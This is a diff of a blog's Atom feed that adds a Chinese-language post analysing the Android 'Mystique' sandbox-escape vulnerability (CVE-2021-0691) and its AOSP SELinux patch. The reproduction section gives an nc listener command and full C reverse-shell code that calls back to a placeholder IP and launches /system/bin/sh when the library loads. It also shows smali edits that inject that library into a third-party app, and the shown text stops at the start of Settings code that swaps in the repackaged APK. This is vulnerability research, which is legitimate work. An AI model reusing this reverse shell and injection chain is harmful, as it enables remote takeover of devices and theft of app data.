@@ -1,5 +1,250 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="https://liwugang.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://liwugang.github.io/" rel="alternate" type="text/html" /><updated>2021-11-06T20:37:16+08:00</updated><id>https://liwugang.github.io/feed.xml</id><title type="html">liwugang</title><subtitle>Patient &amp;&amp; Courage
-</subtitle><author><name>liwugang</name><email>liwugang@outlook.com</email></author><entry><title type="html">如何下载64位的apk？</title><link href="https://liwugang.github.io/2021/11/06/download_64_apk.html" rel="alternate" type="text/html" title="如何下载64位的apk？" /><published>2021-11-06T20:35:00+08:00</published><updated>2021-11-06T20:35:00+08:00</updated><id>https://liwugang.github.io/2021/11/06/download_64_apk</id><content type="html" xml:base="https://liwugang.github.io/2021/11/06/download_64_apk.html">&lt;p&gt;64位的apk指的是so库是64位的，在目前的64位架构机型上运行会更有效率，而现在新机型大多数是64位。但目前各大厂商官网提供的都是32位的apk，这样的apk能跑在所有的机型上，以牺牲了部分性能代价。其实也可以在apk里包含有32位和64位的so，但这样apk包会大不小，大厂基本上都不会这样选择。&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="https://liwugang.github.io/feed.xml" rel="self" type="application/atom+xml" /><link href="https://liwugang.github.io/" rel="alternate" type="text/html" /><updated>2021-11-21T21:35:12+08:00</updated><id>https://liwugang.github.io/feed.xml</id><title type="html">liwugang</title><subtitle>Patient &amp;&amp; Courage
+</subtitle><author><name>liwugang</name><email>liwugang@outlook.com</email></author><entry><title type="html">京东安全发现的魔形女漏洞分析</title><link href="https://liwugang.github.io/2021/11/21/analysis_jd_mystique.html" rel="alternate" type="text/html" title="京东安全发现的魔形女漏洞分析" /><published>2021-11-21T21:23:00+08:00</published><updated>2021-11-21T21:23:00+08:00</updated><id>https://liwugang.github.io/2021/11/21/analysis_jd_mystique</id><content type="html" xml:base="https://liwugang.github.io/2021/11/21/analysis_jd_mystique.html">&lt;p&gt;&lt;img src=&quot;/assets/pictures/security/jd_intro.png&quot; alt=&quot;graph&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;根据&lt;a href=&quot;https://dawnslab.jd.com/mystique/&quot;&gt;魔形女漏洞&lt;/a&gt;网站介绍，可以看到其漏洞可以：&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;打破应用沙箱机制&lt;/li&gt;
+  &lt;li&gt;可攻击其他 app，读取其 app 私有数据等&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;应用沙箱机制，Android 是使用了 Linux 多用户机制，即每个 app 单独 uid，漏洞竟然能打破这个？看到这个就非常好奇。&lt;/p&gt;
+
+&lt;p&gt;这个漏洞从公布我就一直关注，直到最近 AOSP 公开了修复 patch 才搞清楚到底是怎么回事，本文记录下该漏洞的原理和使用模拟器复现该漏洞。&lt;/p&gt;
+
+&lt;!--more--&gt;
+
+&lt;h2 id=&quot;漏洞分析&quot;&gt;漏洞分析&lt;/h2&gt;
+
+&lt;h3 id=&quot;aosp-patch-分析&quot;&gt;AOSP patch 分析&lt;/h3&gt;
+
+&lt;p&gt;AOSP 针对漏洞发布了两个 CVE，CVE-2021-0515 和 CVE-2021-0691。&lt;/p&gt;
+
+&lt;h4 id=&quot;cve-2021-0515&quot;&gt;CVE-2021-0515&lt;/h4&gt;
+
+&lt;p&gt;根据魔形女漏洞网站介绍，该漏洞实际上是本地权限提升漏洞，但结合 CVE-2021-0515 漏洞可进行远程攻击，CVE-2021-0515 修复的是 chromium 相关，是远程攻击链的重要一环，但不是魔形女漏洞最核心的。&lt;/p&gt;
+
+&lt;h4 id=&quot;cve-2021-0691&quot;&gt;CVE-2021-0691&lt;/h4&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/pictures/security/cve_intro.png&quot; alt=&quot;graph&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;从 google 给的安全等级 Moderate 可以看到，危害并不高，但从上面漏洞描述来看，可以绕过应用沙箱机制，难道危害不高吗？&lt;/p&gt;
+
+&lt;p&gt;分析 patch：&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; a/prebuilts/api/30.0/private/system_app.te
++++ b/prebuilts/api/30.0/private/system_app.te
+@@ &lt;span class=&quot;nt&quot;&gt;-72&lt;/span&gt;,12 +72,6 @@
+ &lt;span class=&quot;c&quot;&gt;# Settings need to access app name and icon from asec&lt;/span&gt;
+ allow system_app asec_apk_file:file r_file_perms&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+ 
+-# Allow system_app &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;adb data loader&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; to write data to /data/incremental
+&lt;span class=&quot;nt&quot;&gt;-allow&lt;/span&gt; system_app apk_data_file:file write&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+-
+-# Allow system app &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;adb data loader&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; to &lt;span class=&quot;nb&quot;&gt;read &lt;/span&gt;logs
+&lt;span class=&quot;nt&quot;&gt;-allow&lt;/span&gt; system_app incremental_control_file:file r_file_perms&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+-
+ &lt;span class=&quot;c&quot;&gt;# Allow system apps (like Settings) to interact with statsd&lt;/span&gt;
+ binder_call&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;system_app, statsd&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;修复只是针对 system_app，system_app 是 uid = 1000 并且是系统签名的 apk，修复对 system_app 的权限进行了删除：&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;去掉了对 apk_data_file 的写权限， /data/app(/.&lt;em&gt;)? 和 /data/incremental(/.&lt;/em&gt;)? 目录为 apk_data_file&lt;/li&gt;
+  &lt;li&gt;去掉了对 incremental_control_file 的读文件权限，/data/incremental/MT_[^/] 目录为 incremental_control_file&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;/data/app 会包含有 app 信息，还有这些 app 所使用的 lib 库。而 /data/incremental 并没有有效文件。&lt;/p&gt;
+
+&lt;h4 id=&quot;小结&quot;&gt;小结&lt;/h4&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;能理解危害只有 Moderate，漏洞只影响 system app，这种 app 只有系统厂家才能使用，漏洞利用有限，需要结合 system app 漏洞一起使用&lt;/li&gt;
+  &lt;li&gt;若存在 system app 任意代码执行或者任意文件写，可以对 /data/app 目录下 apk 和 lib 库进行修改替换，这样达到突破沙箱限制&lt;/li&gt;
+  &lt;li&gt;只能进行修改替换，不能新增文件，因为从现有的权限上看，没有创建文件和添加文件的权限，现有权限为：
+&lt;img src=&quot;/assets/pictures/security/apk_perms.png&quot; alt=&quot;graph&quot; /&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h3 id=&quot;其他漏洞&quot;&gt;其他漏洞&lt;/h3&gt;
+
+&lt;h4 id=&quot;三星漏洞&quot;&gt;三星漏洞&lt;/h4&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/pictures/security/sam_cve.png&quot; alt=&quot;graph&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;从描述上看，该漏洞是可以通用远程 socket 控制 system 用户写文件&lt;/p&gt;
+
+&lt;h2 id=&quot;总结&quot;&gt;总结&lt;/h2&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/pictures/security/da_intro.png&quot; alt=&quot;graph&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;结合安全大牛徐昊中的评语和上述分析可知，漏洞主要是由于在 Android 11 上增加了 system_app 写 apk_data_file 的权限，在结合厂商的 system app 的漏洞，就可以对 /data/app 下文件进行修改替换，来得到访问/data/app下 app 的私有数据等信息。回过头来看，最开始的对该漏洞的描述，“攻击任何其他应用”描述过于夸大，其实只能攻击三方 app，或者升级后的系统 app，这样的 app 才会将 apk 保存在 /data/app 目录。&lt;/p&gt;
+
+&lt;h2 id=&quot;复现漏洞&quot;&gt;复现漏洞&lt;/h2&gt;
+
+&lt;p&gt;漏洞需要结合 system app漏洞，为了方便复现，我这边使用有源码的 lineageos 的模拟器操作，（为什么使用这个？因为我最近刚编译了这个^_^）system app 漏洞可以直接在 settings 上修改。利用的话就是反弹 shell，目标 apk 选择了开源文件管理 &lt;a href=&quot;https://github.com/TeamAmaze/AmazeFileManager&quot;&gt;AmazeFileManager&lt;/a&gt;，使用这个 apk 是由于该 apk 包含有 x86 的 so 文件，模拟器是 x86 架构，不能运行 arm 架构，若是有真机，完全可以对任意 app 进行操作。&lt;/p&gt;
+
+&lt;h3 id=&quot;复现思路&quot;&gt;复现思路&lt;/h3&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;本地开启 nc server&lt;/li&gt;
+  &lt;li&gt;反射 shell 代码编译成单独的 so&lt;/li&gt;
+  &lt;li&gt;然后使用 apktool 工具修改目标 apk 的 smali，将 so 加载进去，获取到修改后的 apk&lt;/li&gt;
+  &lt;li&gt;在 settings 上编写代码，修改替换 apk 的 base.apk 和 so 文件&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h4 id=&quot;开启-nc-server&quot;&gt;开启 nc server&lt;/h4&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+nc &lt;span class=&quot;nt&quot;&gt;-vv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 8888  &lt;span class=&quot;c&quot;&gt;# 本地端口 8888&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;反射-shell-代码&quot;&gt;反射 shell 代码&lt;/h4&gt;
+
+&lt;p&gt;核心代码&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;create_reverseshell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;LOGD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;In new thread&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8888&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockaddr_in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;revsockaddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;socket&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SOCK_STREAM&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;LOGD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;socket:%d %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sockt&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;LOGD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;error socket&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;revsockaddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_family&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AF_INET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;revsockaddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_port&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;htons&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;port&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;revsockaddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sin_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;inet_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;XXX.XXX.XXX.XXX&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// nc server IP&lt;/span&gt;
+
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;connect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sockt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;struct&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sockaddr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;revsockaddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
+            &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;revsockaddr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;LOGD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;connect:%d %d&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errno&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sockt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sockt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;dup2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sockt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+
+    &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;const&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/system/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;execve&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/system/bin/sh&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;__attribute__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;constructor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;init_function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;  &lt;span class=&quot;c1&quot;&gt;// so 加载后创建&lt;/span&gt;
+
+    &lt;span class=&quot;n&quot;&gt;LOGD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Create new thread&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;childid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fork&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;childid&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;create_reverseshell&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h4 id=&quot;apk-修改&quot;&gt;apk 修改&lt;/h4&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/pictures/security/path_info.png&quot; alt=&quot;graph&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;由于我们有 so 文件，所以需要修改的有 base.apk 和 lib 下的 librootoperations.so 文件，上面分析过，不能添加文件，只能替换，所以需要将我们的 so 替换成 librootoperations.so。&lt;/p&gt;
+
+&lt;p class=&quot;warning&quot;&gt;当然也可以用 java 实现反射 shell 的逻辑，这样就不用修改 so 了&lt;/p&gt;
+
+&lt;p&gt;我们将 so 加载放到第一个 activity 里面，修改如下：&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Lcom&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;amaze&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filemanager&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ui&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;activities&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;MainActivity&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;super&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Lcom&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;amaze&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;filemanager&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ui&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;activities&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;superclasses&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;PermissionsActivity&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;source&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;MainActivity.java&quot;&lt;/span&gt;
+
+&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;method&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;constructor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clinit&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;()&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;V&lt;/span&gt;
+    &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;locals&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
+    &lt;span class=&quot;kd&quot;&gt;const&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;v0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;rootoperations&quot;&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;我们添加&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;v0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;},&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Ljava&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loadLibrary&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Ljava&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;lang&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;)&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;V&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;我们添加&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;修改完后用 “apktool b” 重新打包并签名，用于后续使用&lt;/p&gt;
+
+&lt;h4 id=&quot;settings-的修改&quot;&gt;Settings 的修改&lt;/h4&gt;
+
+&lt;p&gt;我们在开发者选项中增加了修改替换的逻辑，这样打开开发者选项就能触发，将要修改的 apk 和 so 放到 settings 的 files 目录下， 方便操作：&lt;/p&gt;
+
+&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&lt;span class=&quot;kn&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;com.android.settings.development&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
